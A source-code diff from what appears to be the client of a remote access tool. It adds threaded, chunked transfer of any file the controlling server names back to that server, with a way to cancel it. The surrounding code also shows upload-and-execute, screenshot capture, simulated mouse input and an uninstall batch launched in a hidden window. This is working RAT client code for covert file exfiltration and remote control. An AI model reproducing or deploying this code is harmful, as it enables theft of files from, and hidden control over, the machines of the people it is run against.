@@ -28,6 +28,7 @@ namespace xClient.Core.Commands
 		public static UnsafeStreamCodec StreamCodec;
 		public static Bitmap LastDesktopScreenshot;
 		private static Shell _shell;
+		private static Dictionary<int, string> _cancledDownloads = new Dictionary<int, string>(); 
 
 		private const int MOUSEEVENTF_LEFTDOWN = 0x02;
 		private const int MOUSEEVENTF_LEFTUP = 0x04;
@@ -96,6 +97,7 @@ namespace xClient.Core.Commands
 
 		public static void HandleUploadAndExecute(Packets.ServerPackets.UploadAndExecute command, Client client)
 		{
+			//TODO: rework like DownloadFile
 			new Thread(() =>
 			{
 				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);
@@ -199,11 +201,13 @@ namespace xClient.Core.Commands
 					;
 
 				File.WriteAllText(filename, uninstallBatch);
-				ProcessStartInfo startInfo = new ProcessStartInfo();
-				startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-				startInfo.CreateNoWindow = true;
-				startInfo.UseShellExecute = true;
-				startInfo.FileName = filename;
+				ProcessStartInfo startInfo = new ProcessStartInfo
+				{
+					WindowStyle = ProcessWindowStyle.Hidden,
+					CreateNoWindow = true,
+					UseShellExecute = true,
+					FileName = filename
+				};
 				Process.Start(startInfo);
 			}
 			finally
@@ -325,13 +329,42 @@ namespace xClient.Core.Commands
 
 		public static void HandleDownloadFile(Packets.ServerPackets.DownloadFile command, Client client)
 		{
-			try
+			new Thread(() =>
 			{
-				byte[] bytes = File.ReadAllBytes(command.RemotePath);
-				new Packets.ClientPackets.DownloadFileResponse(Path.GetFileName(command.RemotePath), bytes, command.ID).Execute(client);
+				try
+				{
+					FileSplit srcFile = new FileSplit(command.RemotePath);
+					if (srcFile.MaxBlocks < 0)
+						new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1, srcFile.LastError).Execute(client);
+
+					for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
+					{
+						if (_cancledDownloads.ContainsKey(command.ID)) return;
+
+						byte[] block;
+						if (srcFile.ReadBlock(currentBlock, out block))
+						{
+							new Packets.ClientPackets.DownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError).Execute(client);
+							//Thread.Sleep(200);
+						}
+						else
+							new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1, srcFile.LastError).Execute(client);
+					}
+				}
+				catch (Exception ex)
+				{
+					new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1, ex.Message).Execute(client);
+				}
+			}).Start();
+		}
+
+		public static void HandleDownloadFileCanceled(Packets.ServerPackets.DownloadFileCanceled command, Client client)
+		{
+			if (!_cancledDownloads.ContainsKey(command.ID))
+			{
+				_cancledDownloads.Add(command.ID, "canceled");
+				new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1, "Canceled").Execute(client);
 			}
-			catch
-			{ }
 		}
 
 		public static void HandleMouseClick(Packets.ServerPackets.MouseClick command, Client client)
